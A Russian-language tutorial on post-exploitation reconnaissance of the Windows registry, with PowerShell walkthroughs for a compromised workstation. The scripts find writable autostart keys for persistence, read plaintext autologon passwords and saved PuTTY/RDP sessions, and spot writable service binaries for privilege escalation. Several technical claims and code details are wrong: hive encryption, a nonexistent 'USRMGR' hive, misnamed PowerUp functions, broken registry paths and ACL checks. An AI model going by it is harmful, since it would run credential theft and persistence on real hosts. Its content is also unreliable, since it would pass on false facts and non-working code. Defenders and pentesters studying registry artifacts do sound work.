# Чтение значимых ключей реестра при разведке на скомпрометированном Windows-хосте

## Контекст и базовые понятия: архитектура реестра и его роль в пост-эксплуатации

Реестр Windows (Windows Registry) представляет собой централизованную иерархическую базу данных, хранящую низкоуровневые настройки конфигурации операционной системы, установленных приложений, профилей пользователей и параметров безопасности. В контексте тестирования на проникновение и цифровой криминалистики реестр является одним из наиболее информативных артефактов, поскольку он содержит следы всех действий пользователя и системы, включая историю подключений, сохраненные учетные данные, параметры автозагрузки и конфигурацию сетевых служб. Понимание структуры реестра критически важно для этапа разведки (Post-Exploitation → Enumeration), так как оно позволяет атакующему оценить потенциальные векторы эскалации привилегий, а защитникам — выявить признаки компрометации.

Реестр не является единым файлом; он состоит из набора файлов-хранилищ (hive files), расположенных в директории `%SystemRoot%\System32\config\`. Каждый hive содержит один или несколько корневых разделов (root keys), которые служат точками входа в иерархию. Различия между корневыми разделами определяются областью видимости и контекстом доступа: одни разделы доступны только с правами SYSTEM, другие — только текущему пользователю, третьи — объединяют данные всех пользователей. Путаница между понятиями «ключ» (key), «подраздел» (subkey) и «значение» (value) часто приводит к ошибкам при написании скриптов разведки. Ключ — это узел дерева (аналог папки), подраздел — вложенный узел, а значение — конкретные данные, привязанные к имени и типу данных внутри ключа.

Для специалиста по информационной безопасности важно различать два основных подхода к работе с реестром: онлайн-анализ (через API `RegOpenKeyEx`, `RegQueryValueEx` или утилиты `reg.exe`, `powershell`) и оффлайн-анализ (через прямое чтение hive-файлов). Онлайн-анализ ограничен текущим контекстом безопасности (access token) и уровнем целостности (integrity level) процесса. Оффлайн-анализ требует извлечения hive-файлов (например, SAM, SYSTEM, SECURITY) и их расшифровки с использованием ключа SysKey, что позволяет получить доступ к данным, недоступным в запущенной системе (например, хешам паролей локальных пользователей).

Разграничение между смежными понятиями в контексте разведки:
*   **Registry Key vs. File Path:** Ключ реестра может хранить путь к исполняемому файлу (для автозагрузки), но сам по себе не является файлом. Изменение ключа не меняет файл на диске, но меняет поведение системы при загрузке.
*   **Hive vs. Registry Editor:** Hive — это физический файл на диске (например, `NTUSER.DAT`), а Registry Editor (`regedit.exe`) — это интерфейс для чтения/записи через API. При работе с реестром в пост-эксплуатации часто требуется обходить блокировки файлов, наложенные ОС на hive-файлы.
*   **HKCU vs. HKU:** `HKEY_CURRENT_USER` (HKCU) — это виртуальный раздел, являющийся ссылкой на раздел активного пользователя в `HKEY_USERS` (HKU). Для разведки всех пользователей в системе необходимо работать с `HKU`, а не только с `HKCU`.

| Характеристика | HKEY_LOCAL_MACHINE (HKLM) | HKEY_CURRENT_USER (HKCU) | HKEY_USERS (HKU) |
| :--- | :--- | :--- | :--- |
| **Область действия** | Глобальная (для всей системы) | Локальная (для текущего сеанса) | Глобальная (для всех профилей) |
| **Физическое расположение** | `%SystemRoot%\System32\config\` | `%USERPROFILE%\NTUSER.DAT` | `%USERPROFILE%\NTUSER.DAT` (загруженный) |
| **Требования доступа** | Часто требует прав Admin/SYSTEM | Доступен любому залогиненному пользователю | Требует прав на загрузку hive (обычно Admin) |
| **Ключевые данные для разведки** | SAM, LSA Secrets, Services, Drivers | Сохраненные пароли браузеров, RDP-клиентов | История всех пользователей, MRU-списки |
| **Жизненный цикл** | Статичен до изменения конфигурации | Динамичен, создается при входе пользователя | Динамичен, hive загружается/выгружается |

Важно отметить, что современные версии Windows (10/11, Server 2016+) используют механизмы защиты, такие как Credential Guard и BitLocker, которые усложняют прямой доступ к некоторым данным. Однако базовая структура реестра и логика хранения конфигураций остаются неизменными, что делает знание ключей универсальным навыком для red team и blue team специалистов.

## Внутреннее устройство: структура ключей и механизмы хранения данных

Реестр Windows организован в виде древовидной структуры, где каждый узел может содержать подразделы и значения. Для специалиста по разведке критически важно понимать не только пути к ключам, но и типы хранимых данных, а также механизмы шифрования и защиты, применяемые к ним. Внутреннее устройство реестра можно разделить на несколько функциональных слоев: файловый слой (hive files), слой ядра (Registry Service) и слой API.

### Файловая структура и Hive Files

Каждый корневой раздел соответствует одному или нескольким файлам на диске. Файлы hive имеют бинарный формат и не могут быть прочитаны обычным текстовым редактором. Они зашифрованы с использованием алгоритма RC4 (в старых версиях) или AES (в новых, с использованием ключа, производного от SysKey и GUID системы).

| Hive File | Корневой раздел | Назначение | Доступность для разведки |
| :--- | :--- | :--- | :--- |
| `SAM` | `HKLM\SAM` | Хранение хешей паролей локальных пользователей (LM/NTLM) | Заблокирован ОС при работе. Требует оффлайн-доступа или дампа памяти. |
| `SYSTEM` | `HKLM\SYSTEM` | Конфигурация оборудования, драйверов, служб, политики безопасности. Содержит SysKey. | Заблокирован ОС. Требует оффлайн-доступа для расшифровки SAM. |
| `SECURITY` | `HKLM\SECURITY` | Политики безопасности (Security Policies), списки контроля доступа (ACL) для объектов системы. | Заблокирован ОС. Требует ключа из SYSTEM для доступа. |
| `SOFTWARE` | `HKLM\SOFTWARE` | Настройки установленных приложений, пути к файлам, лицензии. | Доступен для чтения большинству процессов. |
| `NTUSER.DAT` | `HKCU` / `HKU\<SID>` | Настройки конкретного пользователя (рабочий стол, окружение, автозагрузка). | Доступен при активном сеансе. |
| `DEFAULT` | `HKLM\DEFAULT` | Профиль пользователя по умолчанию. Используется для новых пользователей. | Доступен для чтения. |
| `USRMGR` | `HKLM\USRMGR` | Временные данные менеджера пользователей. | Редко используется, часто пуст. |

### Типы значений и их структура

Каждое значение в ключе имеет имя, тип данных и содержимое. Понимание типов данных необходимо для корректной интерпретации результатов разведки.

```json
{
  "key_path": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
  "value_name": "MalwarePersistence",
  "value_type": "REG_SZ",
  "value_data": "C:\\Temp\\payload.exe",
  "description": "Строка с путем к исполняемому файлу для автозагрузки"
}
```

Основные типы значений, встречающиеся при разведке:
*   **REG_SZ:** Строка с фиксированной длиной. Часто используется для путей к файлам, имен пользователей.
*   **REG_EXPAND_SZ:** Строка с переменными окружения (например, `%SystemRoot%\...`). Требует расширения переменных перед использованием.
*   **REG_DWORD:** 32-битное целое число. Используется для флагов (включено/выключено), портов, таймаутов.
*   **REG_BINARY:** Двоичные данные. Часто используется для хранения хешей, сертификатов, конфигураций драйверов.
*   **REG_MULTI_SZ:** Массив строк. Используется для списков путей, параметров сети.

### Механизмы защиты и обхода

Реестр защищается на нескольких уровнях:
1.  **ACL (Access Control Lists):** Каждый ключ реестра имеет дескриптор безопасности. Попытка записи в защищенный ключ (например, `HKLM\SYSTEM`) без прав Admin/SYSTEM приведет к ошибке `ERROR_ACCESS_DENIED`.
2.  **Блокировка файлов:** ОС блокирует файлы `SAM` и `SYSTEM` от прямого копирования через `CopyFile` или `MoveFile`, так как они открыты службой Registry. Для обхода используются методы VSS (Volume Shadow Copy Service) или дамп памяти.
3.  **SysKey:** Ключ шифрования для hive `SAM` и `SECURITY`. Без файла `SYSTEM` (содержащего SysKey) расшифровать `SAM` невозможно.
4.  **Registry Virtualization:** В 64-битных системах 32-битные приложения перенаправляются в `Wow6432Node`. Это важно при поиске конфигураций старых приложений.

Для разведки атакующий должен уметь определять, какие ключи доступны для чтения/записи в текущем контексте. Небезопасные разрешения (например, `Everyone: Full Control`) на ключах автозагрузки или конфигурации служб являются индикатором возможности эскалации привилегий.

## Применение и работа с предметом: инструменты и методы разведки реестра

На этапе пост-эксплуатации разведка реестра направлена на сбор информации для дальнейшего перемещения (lateral movement), эскалации привилегий (privilege escalation) и закрепления (persistence). Работа с реестром осуществляется через встроенные утилиты Windows, PowerShell или специализированные инструменты из арсеналов red team.

### Базовые методы enumeration

1.  **Использование `reg.exe`:** Встроенная утилита командной строки. Позволяет выполнять запросы без загрузки дополнительных скриптов.
    *   `reg query`: Чтение значений.
    *   `reg save`: Сохранение hive в файл (требует прав Admin).
    *   `reg import/export`: Импорт/экспорт разделов.

2.  **Использование PowerShell:** Более гибкий инструмент, позволяющий работать с объектами .NET и WMI.
    *   `Get-ItemProperty`: Чтение свойств ключа.
    *   `Get-ChildItem`: Перечисление подразделов.
    *   `Invoke-RegistrySearch`: Кастомные скрипты для поиска по ключам.

3.  **Специализированные инструменты:**
    *   **PowerUp:** Модуль для PowerShell, автоматизирующий поиск уязвимых ключей реестра (например, для автозагрузки, служб).
    *   **WinPEAS:** Комплексный инструмент для enumeration, включающий анализ реестра на наличие слабых разрешений, сохраненных паролей и конфигурационных аномалий.
    *   **Autoruns (Sysinternals):** Визуализация всех точек автозагрузки, включая реестр.

### Ключевые области разведки

1.  **Автозагрузка (Persistence):**
    *   Ключи: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, `RunOnce`, `UserInit`, `Winlogon`.
    *   Цель: Найти пути к исполняемым файлам, которые запускаются при входе пользователя или загрузке системы.
    *   Метод: Поиск путей, доступных для записи текущему пользователю.

2.  **Сохраненные учетные данные (Credentials):**
    *   Ключи: `HKCU\Software\SimonTatham\PuTTY\Sessions` (пароли SSH), `HKCU\Software\Microsoft\Terminal Server Client\Default` (RDP-пароли), `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` (автовход).
    *   Цель: Извлечение паролей в открытом виде или хешах.
    *   Метод: Чтение значений и дешифрование (если применимо).

3.  **Конфигурация служб и драйверов:**
    *   Ключи: `HKLM\SYSTEM\CurrentControlSet\Services`.
    *   Цель: Поиск служб с небезопасными путями к бинарным файлам (ImagePath), которые можно перезаписать для выполнения кода от имени SYSTEM.
    *   Метод: Проверка прав на файл, указанный в `ImagePath`.

4.  **Сетевая конфигурация и история:**
    *   Ключи: `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces`, `HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings`.
    *   Цель: Определение сетевых настроек, прокси, сохраненных паролей браузера.

### Типичные ошибки и подводные камни

*   **Игнорирование Wow6432Node:** На 64-битных системах 32-битные приложения хранят настройки в `HKLM\SOFTWARE\Wow6432Node`. Разведка только в `HKLM\SOFTWARE` даст неполную картину.
*   **Неправильная интерпретация REG_EXPAND_SZ:** Путь `%SystemRoot%\...` не является абсолютным. Необходимо расширять переменные окружения.
*   **Отсутствие проверки прав:** Попытка записи в ключ без прав приведет к ошибке. Необходимо сначала проверить ACL ключа.
*   **Блокировка hive-файлов:** Попытка скопировать `SAM` через `copy` завершится неудачей. Необходимо использовать `reg save` или VSS.

## Сквозной практический пример: Разведка сохраненных паролей и точек автозагрузки

**Исходные условия:**
*   **Среда:** Windows 10 Pro (21H2), скомпрометированная рабочая станция.
*   **Роль:** Атакующий с правами локального пользователя (Standard User).
*   **Инструменты:** PowerShell, утилита `reg.exe`, скрипт `PowerUp.ps1`.
*   **Сценарий:** Атакующий получил shell на рабочей станции и должен найти сохраненные учетные данные для перемещения и точки для закрепления доступа.

### Шаг 1: Проверка прав и контекста

Первым делом необходимо определить текущий контекст безопасности и права на чтение реестра.

```powershell
# Проверка текущего пользователя и прав
whoami /priv
whoami /groups

# Попытка чтения глобального ключа (должна завершиться ошибкой для обычного пользователя)
reg query HKLM\SECURITY /s 2>&1
```

**Ожидаемый вывод:**
*   `whoami /priv`: Выводит список привилегий текущего пользователя (например, SeChangeNotify, SeShutdown). Отсутствие `SeDebugPrivilege` или `SeBackupPrivilege` ограничивает доступ к некоторым данным.
*   `reg query HKLM\SECURITY`: Ошибка `Access is denied`. Это подтверждает, что прямой доступ к hive `SECURITY` невозможен без прав Admin.

### Шаг 2: Enumeration точек автозагрузки (Persistence)

Атакующий ищет ключи автозагрузки, в которые он может записать свой payload.

```powershell
# Использование PowerShell для перечисления ключей Run
$runKeys = @(
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    Write-Host "`n=== $key ==="
    try {
        $values = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
        if ($values) {
            $values | Get-Member -MemberType NoteProperty | ForEach-Object {
                $name = $_.Name
                $path = $values.$name
                Write-Host "  [$name] -> $path"
                
                # Проверка прав на запись в родительский ключ (упрощенно)
                $acl = Get-Acl $key
                $access = $acl.Access | Where-Object { $_.IdentityReference -eq (New-Object System.Security.Principal.NTAccount($env:USERNAME)) }
                if ($access -and $access.FileSystemRights -like "*Write*") {
                    Write-Host "    [!] User has write access to this key!" -ForegroundColor Red
                }
            }
        }
    } catch {
        Write-Host "  [!] Access denied or key not found" -ForegroundColor Yellow
    }
}
```

**Ожидаемый вывод:**
*   Для `HKCU\...Run`: Выводит список значений, например, `Skype -> C:\Program Files (x86)\Skype\Phone\Skype.exe`.
*   Для `HKLM\...Run`: Ошибка доступа (если пользователь не Admin).
*   Если пользователь имеет права на запись в `HKCU\...Run`, это указывает на возможность создания persistence без эскалации.

### Шаг 3: Поиск сохраненных паролей в реестре

Атакующий ищет ключи, содержащие пароли от популярных приложений.

```powershell
# Поиск паролей в PuTTY
$puttyKey = "HKCU\Software\SimonTatham\PuTTY\Sessions"
if (Test-Path $puttyKey) {
    Write-Host "`n=== PuTTY Sessions ==="
    $sessions = Get-ChildItem $puttyKey
    foreach ($session in $sessions) {
        $sessionData = Get-ItemProperty $session.PSPath
        if ($sessionData.PSEdition -eq "Core") {
             # Обработка свойств сессии
             Write-Host "Session: $($session.Name)"
             # Пароли часто хранятся в зашифрованном виде или в отдельных значениях
             # Для PuTTY пароли могут быть в открытом виде в старых версиях или зашифрованы
        }
    }
}

# Поиск паролей RDP
$rdpKey = "HKCU\Software\Microsoft\Terminal Server Client\Default"
if (Test-Path $rdpKey) {
    Write-Host "`n=== RDP Default ==="
    Get-ItemProperty $rdpKey | Format-List
}

# Поиск паролей Winlogon (автовход)
$winlogonKey = "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
if (Test-Path $winlogonKey) {
    Write-Host "`n=== Winlogon AutoLogon ==="
    try {
        $winlogonData = Get-ItemProperty $winlogonKey -ErrorAction SilentlyContinue
        if ($winlogonData.DefaultUserName -and $winlogonData.DefaultPassword) {
            Write-Host "Found AutoLogon Credentials:" -ForegroundColor Red
            Write-Host "  User: $($winlogonData.DefaultUserName)"
            Write-Host "  Pass: $($winlogonData.DefaultPassword)"
        }
    } catch {
        Write-Host "  [!] Access denied to Winlogon key" -ForegroundColor Yellow
    }
}
```

**Ожидаемый вывод:**
*   Для PuTTY: Выводит список сессий. В зависимости от версии PuTTY, пароли могут быть в открытом виде в значении `Password` или зашифрованы.
*   Для RDP: Выводит список серверов, к которым подключался пользователь.
*   Для Winlogon: Если автовход настроен, выводятся имя пользователя и пароль в открытом виде. Это критическая находка.

### Шаг 4: Анализ уязвимых служб (Privilege Escalation)

Поиск служб, путь к бинарному файлу которых доступен для записи.

```powershell
# Использование PowerUp для автоматизации поиска
# Загрузка модуля
Import-Module .\PowerUp.ps1

# Поиск уязвимых служб
Write-Host "`n=== Vulnerable Services ==="
Get-ServiceUnquoted | Where-Object { $_.PathName -like "* *" }
Get-ServiceWritableBinPath | Where-Object { $_.PathName -like "* *" }

# Ручная проверка прав на файл
$serviceKey = "HKLM\SYSTEM\CurrentControlSet\Services"
$services = Get-ChildItem $serviceKey
foreach ($svc in $services) {
    $path = (Get-ItemProperty $svc.PSPath).ImagePath
    if ($path -and (Test-Path $path)) {
        $acl = Get-Acl $path
        $access = $acl.Access | Where-Object { $_.IdentityReference -eq (New-Object System.Security.Principal.NTAccount($env:USERNAME)) }
        if ($access -and $access.FileSystemRights -like "*Write*") {
            Write-Host "  [!] Writable binary path: $path" -ForegroundColor Red
            Write-Host "      Service: $($svc.PSChildName)"
        }
    }
}
```

**Ожидаемый вывод:**
*   PowerUp выводит список служб с путями, содержащими пробелы (незаключенные в кавычки), что позволяет инъекцию кода.
*   Ручная проверка выявляет службы, бинарный файл которых может быть перезаписан текущим пользователем.

### Ожидаемый вывод примера

В результате разведки атакующий обнаруживает:
1.  Ключ `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` доступен для записи, что позволяет создать persistence.
2.  В `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` найдены учетные данные автовхода для локального администратора.
3.  Служба `ExampleService` имеет путь к бинарному файлу, доступный для записи.

Эти данные позволяют атакующему либо сразу получить доступ к системе через найденные учетные данные, либо закрепить доступ через автозагрузку.

## Аналитический вывод

Чтение значимых ключей реестра является фундаментальным этапом пост-эксплуатации на Windows-хостах, так как реестр концентрирует в себе критически важную информацию для перемещения, закрепления и эскалации привилегий. Ключевым аспектом разведки реестра является понимание разницы между онлайн-доступом (ограниченным контекстом безопасности) и оффлайн-доступом (позволяющим извлекать хеши паролей из SAM). Атакующие активно используют уязвимые разрешения (ACL) на ключах автозагрузки и конфигурации служб для обхода механизмов защиты, в то время как защитники должны мониторить изменения в этих разделах и настраивать строгие политики доступа. Эффективная разведка требует не только знания путей к ключам, но и понимания типов данных, механизмов шифрования (SysKey) и особенностей виртуализации реестра в 64-битных системах. Интеграция автоматизированных инструментов (PowerUp, WinPEAS) с ручным анализом ACL и контекста позволяет максимизировать эффективность сбора информации и минимизировать риск обнаружения.
